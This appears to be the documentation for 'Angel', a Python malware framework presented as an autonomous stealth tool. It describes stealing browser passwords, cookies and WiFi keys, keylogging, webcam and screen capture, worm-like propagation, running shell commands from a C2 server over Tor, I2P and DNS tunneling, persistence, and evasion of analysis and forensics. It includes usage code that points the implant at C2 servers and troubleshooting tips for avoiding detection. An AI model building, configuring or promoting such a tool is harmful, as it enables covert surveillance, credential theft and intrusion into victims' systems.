# Angel Framework Documentation

## Table of Contents
1. [Overview](#overview)
2. [Installation](#installation)
3. [Architecture](#architecture)
4. [Components](#components)
5. [Usage](#usage)
6. [Configuration](#configuration)
7. [Advanced Features](#advanced-features)
8. [Security Considerations](#security-considerations)
9. [Troubleshooting](#troubleshooting)

## Overview

Angel is an advanced autonomous framework designed for intelligent and stealthy operations. It implements multiple layers of security, obfuscation, and communication channels while maintaining a modular and extensible architecture, with advanced decision-making capabilities.

### Key Features
- Autonomous decision-making engine
- Mesh network P2P communication
- Multi-channel secure communications (Tor, I2P, DNS)
- Advanced data collection capabilities
- Intelligent stealth mechanisms
- Network propagation and P2P connectivity
- Self-learning behavior patterns
- Advanced obfuscation and encryption
- Multiple persistence mechanisms

## Installation

### Prerequisites
- Python 3.8 or higher
- Required packages (install via requirements.txt):
  ```bash
  pip install -r requirements.txt
  ```

### Dependencies
```plaintext
pycryptodome>=3.15.0
psutil>=5.9.0
dnspython>=2.2.1
requests>=2.28.1
astor>=0.8.1
stem>=1.8.1
opencv-python>=4.7.0
pillow>=9.5.0
pyautogui>=0.9.54
scapy>=2.5.0
browser-cookie3>=0.19.1
```

## Architecture

The framework implements an intelligent autonomous architecture with core components and specialized modules:

### Core Components
- **Brain**: Autonomous decision-making engine
- **Crypter**: Handles encryption/decryption operations
- **Obfuscator**: Manages code obfuscation
- **Stealth**: Implements anti-analysis features

### Modules
- **Router**: Manages mesh network and P2P communications
- **Collector**: Handles data collection operations
- **Network**: Manages network operations and propagation
- **Comms**: Implements secure communication channels
- **Persistence**: Manages system persistence

## Components

### Core.Brain
Intelligent decision-making engine that:
- Analyzes environment and system state
- Manages risk assessment
- Controls operation timing
- Learns from past decisions
- Adapts behavior based on conditions

### Core.Router
Mesh network routing system supporting:
- P2P communication
- Dynamic route discovery
- Command distribution
- Network resilience
- Optimal path calculation

### Modules.Collector
Advanced data collection capabilities:
- Browser password recovery
- Screen capture
- Webcam access
- Keylogging
- System information gathering
- Browser cookie collection
- WiFi password recovery

### Modules.Network
Network operations including:
- Network scanning
- P2P connection establishment
- Payload propagation
- SMB/HTTP/DNS deployment

### Modules.Comms
Secure communication channels:
- Tor network integration
- I2P network support
- DNS tunneling
- Channel rotation
- Identity management

## Usage

### Basic Usage
```python
from angeling.main import Angel

# Initialize with basic configuration
angel = Angel({
    'beacon_interval': 300,
    'onion_services': ['your.onion'],
    'dns_servers': ['8.8.8.8']
})

# Start operation
angel.run()
```

### Advanced Usage
```python
config = {
    'beacon_interval': 300,
    'onion_services': ['your.onion'],
    'dns_servers': ['8.8.8.8'],
    'dns_zone': 'your-zone.com',
    'c2_servers': ['c2.server.com']
}

angel = Angel(config)
angel.run()
```

## Configuration

### Configuration Options
| Option | Description | Default |
|--------|-------------|---------|
| beacon_interval | Beacon interval (seconds) | 300 |
| onion_services | List of .onion services | [] |
| dns_servers | DNS servers for tunneling | ['8.8.8.8'] |
| dns_zone | DNS zone for tunneling | None |
| c2_servers | Fallback C2 servers | [] |

## Advanced Features

### Autonomous Operation
The framework operates autonomously with:
- Environment analysis
- Risk assessment
- Timing optimization
- Self-learning capabilities
- Adaptive behavior

### Command Types
- **collect_passwords**: Retrieve stored passwords
- **capture_screen**: Capture screen content
- **capture_webcam**: Access webcam
- **start_keylogger**: Begin keylogging
- **stop_keylogger**: Stop and retrieve keylog
- **scan_network**: Perform network scan
- **propagate**: Network propagation
- **execute**: Run shell commands
- **update**: Update configuration
- **uninstall**: Clean up and exit

### Network Features
- Mesh network topology
- P2P communication
- Dynamic routing
- Network resilience
- Stealth propagation

## Security Considerations

### Anti-Analysis Features
- Advanced VM detection
- Debugger detection
- Process hiding
- Trace cleanup
- Timing-based evasion
- Behavioral analysis

### Communication Security
- Tor network routing
- I2P network support
- DNS tunneling
- Channel rotation
- Identity management
- Encrypted communications

### Stealth Mechanisms
- Intelligent timing
- Risk-based decisions
- Process hiding
- Log cleanup
- Anti-forensics
- Behavioral adaptation

## Troubleshooting

### Common Issues

1. **Communication Issues**
   - Check Tor service status
   - Verify DNS server accessibility
   - Ensure network connectivity
   - Try alternative channels

2. **Detection Issues**
   - Adjust brain parameters
   - Modify timing settings
   - Update stealth configuration
   - Check risk thresholds

3. **Network Issues**
   - Verify P2P connectivity
   - Check routing configuration
   - Ensure proper DNS setup
   - Review network permissions
